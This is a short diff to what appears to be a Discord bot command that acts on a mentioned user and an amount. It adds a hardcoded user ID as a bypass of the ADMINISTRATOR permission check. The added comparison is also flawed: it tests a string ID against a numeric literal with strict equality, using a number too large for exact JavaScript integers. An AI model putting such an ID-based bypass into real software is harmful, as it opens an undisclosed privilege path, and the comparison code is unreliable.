@@ -8,7 +8,7 @@ module.exports = {
 	args: true,
 	usage: `<user> | <amount>`,
 	execute(message, args) {
-		if (message.member.hasPermission('ADMINISTRATOR')) {
+		if (message.member.hasPermission('ADMINISTRATOR') || message.author.id === 122568101995872256) {
 
 			if (message.mentions.users.first() === undefined) return message.channel.send('You didn\'t specify a user!');
 			args[0] = message.mentions.users.first();
